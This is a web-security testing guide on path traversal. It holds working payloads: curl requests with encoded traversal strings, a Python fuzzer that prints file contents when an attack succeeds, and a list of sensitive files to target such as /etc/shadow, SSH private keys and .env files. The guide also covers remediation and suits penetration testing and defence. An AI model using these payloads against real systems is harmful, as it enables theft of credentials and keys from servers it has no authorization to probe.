# Path Traversal (Directory Traversal)

## Overview
Path traversal (also called directory traversal or dot-dot-slash attack) allows attackers to access files and directories outside the intended web root by manipulating file paths using `../` sequences. When user-controlled input is used to construct file paths without proper sanitization, attackers can read sensitive server files like `/etc/passwd`, application configuration files, private keys, and database credentials.

## How It Works
- The application takes a user-supplied filename and reads it: `open("/var/www/uploads/" + user_input)`.
- Attacker supplies `../../../../etc/passwd` as the input.
- The path resolves to `/etc/passwd` regardless of the intended base directory.
- URL-encoded variants: `%2e%2e%2f` or double-encoded `%252e%252e%252f` bypass naive filters.
- Null byte injection (`../etc/passwd%00.jpg`) can truncate file extensions in older PHP versions.
- On Windows: `..\..\..\windows\win.ini` using backslash traversal.

## Impact
- Reading `/etc/passwd` — user enumeration.
- Reading `/etc/shadow` — password hash extraction.
- Reading application source code, configuration files (`database.yml`, `.env`, `config.php`).
- Reading SSL private keys, SSH keys (`~/.ssh/id_rsa`).
- Reading cloud metadata (`/proc/self/environ`, AWS metadata via SSRF).
- In some cases, write traversal → code execution.

## Where to Look
- `file=`, `filename=`, `path=`, `page=`, `document=`, `template=` URL parameters.
- File download endpoints: `/download?file=report.pdf`.
- PDF/image generation with user-supplied filenames.
- Template rendering with user-controlled template name.
- Log file viewers, config file editors in admin panels.
- API endpoints accepting a path as a parameter.

## Testing Steps
1. Identify parameters that reference files or paths.
2. Test basic traversal: `../../../../etc/passwd`.
3. Test URL-encoded: `..%2F..%2F..%2F..%2Fetc%2Fpasswd`.
4. Test double-encoded: `..%252F..%252F..%252F..%252Fetc%252Fpasswd`.
5. Test backslash on Windows: `..\..\..\windows\win.ini`.
6. Test null byte: `../../../../etc/passwd%00.jpg`.
7. Test absolute path: `/etc/passwd` (skip traversal entirely).
8. Check for Windows path: `C:\windows\win.ini`.
9. On confirmed read, look for sensitive files: private keys, DB credentials, source code.

## Payloads / Techniques
```bash
# Basic path traversal
curl -s "https://target.com/download?file=../../../../etc/passwd"
curl -s "https://target.com/view?page=../../../etc/passwd"

# URL encoded
curl -s "https://target.com/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# Double URL encoded
curl -s "https://target.com/download?file=..%252F..%252F..%252F..%252Fetc%252Fpasswd"

# Mixed slash/backslash
curl -s "https://target.com/download?file=..%5c..%5c..%5cetc%5cpasswd"

# Null byte injection
curl -s "https://target.com/download?file=../../../../etc/passwd%00.jpg"

# Absolute path injection
curl -s "https://target.com/download?file=/etc/passwd"
curl -s "https://target.com/download?file=/proc/self/environ"
curl -s "https://target.com/download?file=/var/www/html/config.php"

# Interesting files to read:
# Linux:
# /etc/passwd, /etc/shadow, /etc/hosts, /etc/hostname
# /proc/self/environ, /proc/self/cmdline
# ~/.ssh/id_rsa, ~/.ssh/authorized_keys
# /var/www/html/.env, /var/www/html/config.php
# /etc/nginx/nginx.conf, /etc/apache2/sites-enabled/000-default.conf
# /var/log/apache2/access.log, /var/log/auth.log
# Windows:
# C:\windows\win.ini, C:\windows\system32\drivers\etc\hosts
# C:\inetpub\wwwroot\web.config, C:\xampp\htdocs\config.php
```

```python
# Automated path traversal fuzzer
import requests

TARGET = "https://target.com/download"
PARAM = "file"

payloads = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

for payload in payloads:
    r = requests.get(f"{TARGET}?{PARAM}={payload}")
    if "root:" in r.text or "daemon:" in r.text:
        print(f"VULNERABLE! Payload: {payload}")
        print(r.text[:500])
        break
    print(f"[{r.status_code}] Payload: {payload}")
```

## Burp Suite Tips
- In **Intruder**, fuzz the file parameter with a path traversal payload list from SecLists.
- SecLists path: `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`.
- **Active Scanner** (Pro) tests for path traversal automatically.
- In **Repeater**, manually test different encoding variants.
- Check response length — a file containing `/etc/passwd` will have a specific length.

## Tools
- Burp Suite Intruder + SecLists LFI wordlist
- dotdotpwn — https://github.com/wireghoul/dotdotpwn (automated path traversal testing)
- ffuf — fast fuzzing

## Remediation
- Use `Path.resolve()` or equivalent to resolve the final path, then verify it starts with the allowed base directory.
- In Python: `os.path.realpath()` + check `startswith(base_dir)`.
- Never concatenate user input directly into file paths.
- Use a whitelist of allowed file names or an indirect mapping (ID → actual filename).
- Run the application process as a least-privileged user that cannot read sensitive OS files.
- Use chroot jails or container isolation to limit accessible file system paths.

## References
https://portswigger.net/web-security/file-path-traversal
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
